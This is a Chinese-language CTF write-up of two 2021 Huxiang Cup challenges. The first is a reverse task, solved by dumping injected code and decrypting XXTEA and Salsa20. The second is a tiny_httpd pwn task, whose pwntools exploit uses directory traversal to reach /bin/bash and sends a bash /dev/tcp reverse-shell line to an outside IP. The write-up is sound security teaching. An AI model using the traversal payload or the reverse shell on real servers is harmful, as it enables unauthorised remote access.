# 前言
这是2021湖湘杯线上赛的re和pwn部分wp，对本人而言赛题还是有一定难度的。
# Reverse -> Hideit
# 题目分析
## 题目信息
[附件]()
内容：真正的入口往往不是表面上看到的那样。
运行结果如下:
```
Let's start the game!
First secret here:
1111111
```
## 题目分析
可以看到题目给出的是一个64位的exe文件，ida查看逻辑如下：
```c
__int64 sub_140001000()
{
  HANDLE v0; // rbx

  puts("Let's start the game!");
  v0 = GetCurrentProcess();
  lpAddress = VirtualAllocEx(v0, 0i64, 0xBD85ui64, 0x3000u, 4u);
  WriteProcessMemory(v0, lpAddress, &unk_140003040, 0xBC85ui64, 0i64);
  return ((__int64 (*)(void))lpAddress)();
}
```
程序逻辑清晰明白，但是没有看到程序主逻辑，这里有两个操作，分别是VirtualAllocEx申请内存，WriteProcessMemory写入内存，然后调用内存。可知主函数逻辑（程序）很可能被写入内存然后执行，用x64_dbg去dump内存，找到lpAddress地址，下硬件断点，到这里后，网往上找MZ头，然后dump该段内存：
```
00000256894D0000 | 4D:5A                    | pop r10                                 |
00000256894D0002 | 90                       | nop                                     |
00000256894D0003 | 0003                     | add byte ptr ds:[rbx],al                | rbx:&"\n\n"
00000256894D0005 | 0000                     | add byte ptr ds:[rax],al                |
00000256894D0007 | 000400                   | add byte ptr ds:[rax+rax],al            |
00000256894D000A | 0000                     | add byte ptr ds:[rax],al                |
00000256894D000C | FF                       | ???                                     |
00000256894D000D | FF00                     | inc dword ptr ds:[rax]                  |
00000256894D000F | 00B8 00000000            | add byte ptr ds:[rax],bh                |
00000256894D0015 | 0000                     | add byte ptr ds:[rax],al                |
00000256894D0017 | 0040 00                  | add byte ptr ds:[rax],al                |
00000256894D001A | 0000                     | add byte ptr ds:[rax],al                |
```
使用插件Scylla去dump该段内存得到一个[dll文件]()(建议64位在win10上调试)，打开后可以看到程序的主逻辑;
```c
int __fastcall sub_1B86E0E1BB0(__int64 key)
{
  __int64 v2; // rbx
  unsigned int v3; // er9
  int v4; // esi
  unsigned int v5; // er10
  unsigned int v6; // edi
  unsigned int v7; // er11
  __int64 v8; // r8
  __int64 v10; // [rsp+40h] [rbp-C0h] BYREF
  char v11; // [rsp+48h] [rbp-B8h]
  __int64 v12; // [rsp+50h] [rbp-B0h] BYREF
  int keya[4]; // [rsp+60h] [rbp-A0h]
  CHAR MultiByteStr[16]; // [rsp+70h] [rbp-90h] BYREF
  __int128 v15; // [rsp+80h] [rbp-80h]
  char v16; // [rsp+90h] [rbp-70h]
  _DWORD key_ex[12]; // [rsp+A0h] [rbp-60h] BYREF
  __int64 v18; // [rsp+D0h] [rbp-30h]
  int v19; // [rsp+D8h] [rbp-28h]
  int v20; // [rsp+DCh] [rbp-24h]
  char output[512]; // [rsp+E0h] [rbp-20h] BYREF
  WCHAR Data[280]; // [rsp+2E0h] [rbp+1E0h] BYREF
  DWORD cbData; // [rsp+528h] [rbp+428h] BYREF
  DWORD Type; // [rsp+530h] [rbp+430h] BYREF
  HKEY phkResult; // [rsp+538h] [rbp+438h] BYREF

  v2 = 0i64;
  v16 = 0;
  *(_OWORD *)MultiByteStr = 0i64;
  phkResult = 0i64;
  v15 = 0i64;
  if ( !RegOpenKeyW(HKEY_LOCAL_MACHINE, SubKey, &phkResult) )
  {
    Type = 0;
    memset(Data, 0, 0x208ui64);
    cbData = 66;
    if ( !RegQueryValueExW(phkResult, ValueName, 0i64, &Type, (LPBYTE)Data, &cbData) )
      WideCharToMultiByte(0, 0, Data, -1, MultiByteStr, 0x104, 0i64, 0i64);
  }
  puts(Buffer);
  v10 = 0i64;
  v11 = 0;
  sub_1B86E0E1B50("%s", (const char *)&v10);
  v12 = 0i64;
  strcpy((char *)&v12, (const char *)&v10);
  keya[0] = 114;
  keya[1] = 514;
  keya[2] = 19;
  keya[3] = 19;
  memset(output, 0, sizeof(output));
  v3 = HIDWORD(v12);
  v4 = 32;
  v5 = v12;
  v6 = HIDWORD(v12);
  v7 = 0;
  do
  {
    v7 -= 0x61C88647;                           // xxtea
    v8 = (v7 >> 2) & 3;
    v5 += ((v7 ^ v3) + (v6 ^ keya[v8])) ^ (((16 * v6) ^ (v3 >> 3)) + ((v6 >> 5) ^ (4 * v3)));
    v3 += ((v7 ^ v5) + (v5 ^ keya[v8 ^ 1])) ^ (((16 * v5) ^ (v5 >> 3)) + ((v5 >> 5) ^ (4 * v5)));
    v6 = v3;
    --v4;
  }
  while ( v4 );
  if ( v5 == 0x1130BE1B && v3 == 0x63747443 )
  {
    v18 = 0i64;
    v19 = (unsigned __int8)v10 | ((BYTE1(v10) | (WORD1(v10) << 8)) << 8);
    v20 = BYTE4(v10) | ((BYTE5(v10) | (HIWORD(v10) << 8)) << 8);
    key_extension(key_ex, (unsigned __int8 *)key);
    sub_1B86E0E1150(key_ex, (__int128 *)MultiByteStr, output);
    while ( enc_data[v2] == output[v2] )
    {
      if ( ++v2 >= 32 )
        return puts(aYouFindLastSec);
    }
  }
  return 0;
}
```
findcrypt查找得到有两种加密算法xxtea和salsa20
```
.text:000001B86EO...  global     TEA_DELTA_1B86EOE1D33    $c0    b'\xb9y7\x9e'
.rdata:000001B86E...  global     salsa20_1B86EOE31AO      $c0    b'expand 32-byte k'

```
加密逻辑为：
1. 将输入的字符经过xxtea加密后符合条件进入第二个salsa20加密逻辑。
2. salsa20经过密钥拓展然后进行加密，然后和固定字节作比较，相同则成功。
这里salsa20（chacha20）的密钥拓展和便准的有点区别，组合了输入的字符串。经过xxtea解密可以得到第一步密钥为`dotitsit`,由于key_extension和标准有点区别，这里直接调试得到初始化后的key_ex:
```
0000006551B6EEF0  65 78 70 61 6E 64 20 33 32 2D 62 79 74 65 20 6B  expand 32-byte k  
0000006551B6EF00  30 4E 33 40 61 59 49 5F 4D 33 6C 30 64 79 5F 4B  0N3@aYI_M3l0dy_K  
0000006551B6EF10  75 72 4F 6D 31 5F 57 5F 53 75 6B 31 64 71 79 30  urOm1_W_Suk1dqy0  
0000006551B6EF20  00 00 00 00 00 00 00 00 64 6F 74 69 74 73 69 74  ........dotitsit  

```
然后进行解密即可
```c
加密前原始数据：1130be1b 63747443
加密后的数据：69746f64 74697374
s1 = doti
s1 = tsit
1d38f830
key:
30 4e 33 40 61 59 49 5f 4d 33 6c 30 64 79 5f 4b
75 72 4f 6d 31 5f 57 5f 53 75 6b 31 64 71 79 30

encrypted:
eb 8e 5c a5 62 b4 1c 84 5c 59 fc 0d 43 3c ab 20
d8 93 33 13 a1 9e 39 00 76 14 b5 04 58 9d 06 b8

decrypted:
66 6c 61 67 7b 46 31 4e 44 4d 33 5f 34 66 37 33
72 5f 37 48 33 5f 35 68 33 4c 4c 43 30 44 33 7d
flag{F1NDM3_4f73r_7H3_5h3LLC0D3}
```
[源代码]()
## 总结
这道题主要是考察了从内存dump程序和两个加密算法xxtea和salsa20的识别与加解密，题目难度中等，对选手赛前准备和代码编写有一定要求。
# tiny_httpd
## 题目分析
题目给了部署文件和源码，只要审源码就可以发现漏洞点所在。
```c
void accept_request(void *arg)
{
    int client = (intptr_t)arg;
    char buf[1024];
    size_t numchars;
    char method[255];
    char url[255];
    char path[512];
    size_t i, j;
    struct stat st;
    int cgi = 0;      /* becomes true if server decides this is a CGI
                       * program */
    char *query_string = NULL;

    numchars = get_line(client, buf, sizeof(buf));
    i = 0; j = 0;
    while (!ISspace(buf[i]) && (i < sizeof(method) - 1))
    {
        method[i] = buf[i];
        i++;
    }
    j=i;
    method[i] = '\0';

    if (strcasecmp(method, "GET") && strcasecmp(method, "POST"))
    {
        unimplemented(client);
        return;
    }

    if (strcasecmp(method, "POST") == 0)
        cgi = 1;

    i = 0;
    while (ISspace(buf[j]) && (j < numchars))
        j++;
    while (!ISspace(buf[j]) && (i < sizeof(url) - 1) && (j < numchars))
    {
        url[i] = buf[j];
        i++; j++;
    }
    url[i] = '\0';

    if (strcasecmp(method, "GET") == 0)
    {
        query_string = url;
        while ((*query_string != '?') && (*query_string != '\0'))
            query_string++;
        if (*query_string == '?')
        {
            cgi = 1;
            *query_string = '\0';
            query_string++;
        }
    }

    sprintf(path, "htdocs%s", url);
    if (path[strlen(path) - 1] == '/')
        strcat(path, "index.html");


    /* path filter */
    int len = strlen(path);
    for (i = 0, j = 0; j < len;) {
        if (path[j] == '.' && path[j + 1] == '.') {  <------目录穿越
            j++;
        }
        path[i++] = path[j++];
    }
    path[i++] = '\0';

    if (stat(path, &st) == -1) {
        while ((numchars > 0) && strcmp("\n", buf))  /* read & discard headers */
            numchars = get_line(client, buf, sizeof(buf));
        not_found(client);
    }
    else
    {
        if ((st.st_mode & S_IFMT) == S_IFDIR)
            strcat(path, "/index.html");
        if ((st.st_mode & S_IXUSR) ||
                (st.st_mode & S_IXGRP) ||
                (st.st_mode & S_IXOTH)    )
            cgi = 1;
        if (!cgi)
            serve_file(client, path);
        else
            execute_cgi(client, path, method, query_string);
    }

    close(client);
}
```
在解析过滤path存在目录穿越漏洞，这里解析了`.`,存在两个点相邻path就往后移动一位，然后复制给path，可以构造`//...//...//...//...//...//...//...//...//...//.../bin/bash`,经过过滤变成`//..//..//..//..//..//..//..//..//..//../bin/bash`后续execute_cgi函数去执行cgi,利用目录穿越让path被解析为`/bin/bash`,
```c
void execute_cgi(int client, const char *path,
        const char *method, const char *query_string)
{
    char buf[1024];
    int cgi_output[2];
    int cgi_input[2];
    pid_t pid;
    int status;
    int i;
    char c;
    int numchars = 1;
    int content_length = -1;

    buf[0] = 'A'; buf[1] = '\0';
    if (strcasecmp(method, "GET") == 0)
        while ((numchars > 0) && strcmp("\n", buf))  /* read & discard headers */
            numchars = get_line(client, buf, sizeof(buf));
    else if (strcasecmp(method, "POST") == 0) /*POST*/
    {
        numchars = get_line(client, buf, sizeof(buf));
        while ((numchars > 0) && strcmp("\n", buf))
        {
            buf[15] = '\0';
            if (strcasecmp(buf, "Content-Length:") == 0)
                content_length = atoi(&(buf[16]));
            numchars = get_line(client, buf, sizeof(buf));
        }
        if (content_length == -1) {
            bad_request(client);
            return;
        }
    }
    else/*HEAD or other*/
    {
    }


    if (pipe(cgi_output) < 0) {
        cannot_execute(client);
        return;
    }
    if (pipe(cgi_input) < 0) {
        cannot_execute(client);
        return;
    }

    if ( (pid = fork()) < 0 ) {
        cannot_execute(client);
        return;
    }
    sprintf(buf, "HTTP/1.0 200 OK\r\n");
    send(client, buf, strlen(buf), 0);
    if (pid == 0)  /* child: CGI script */
    {
        char meth_env[255];
        char query_env[255];
        char length_env[255];

        dup2(cgi_output[1], STDOUT);
        dup2(cgi_input[0], STDIN);
        close(cgi_output[0]);
        close(cgi_input[1]);
        sprintf(meth_env, "REQUEST_METHOD=%s", method);
        putenv(meth_env);
        if (strcasecmp(method, "GET") == 0) {
            sprintf(query_env, "QUERY_STRING=%s", query_string);
            putenv(query_env);
        }
        else {   /* POST */
            sprintf(length_env, "CONTENT_LENGTH=%d", content_length);
            putenv(length_env);
        }
        execl(path, NULL);  <----execl('/bin/sh',null)
        exit(0);
    } else {    /* parent */
        close(cgi_output[1]);
        close(cgi_input[0]);
        if (strcasecmp(method, "POST") == 0)
            for (i = 0; i < content_length; i++) {
                recv(client, &c, 1, 0);
                write(cgi_input[1], &c, 1);
            }

        /*
        while (read(cgi_output[0], &c, 1) > 0)
            send(client, &c, 1, 0);
        */

        close(cgi_output[0]);
        close(cgi_input[1]);
        waitpid(pid, &status, 0);
    }
}
```
## exp
```python
from pwn import *
context.log_level = 'debug'
p = remote('127.0.0.1', 9999)
 
ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

sl(b'POST //...//...//...//...//...//...//...//...//...//.../bin/bash')
sl(b'Content-Length: 100')
p.sendline()
p.sendline()
sl('bash -i >& /dev/tcp/192.168.46.128/12346 0>&1')
p.interactive()
```
## 总结 
这个题目结合了web的一些知识，提供了源码，减低了题目难度，需要进行代码审计。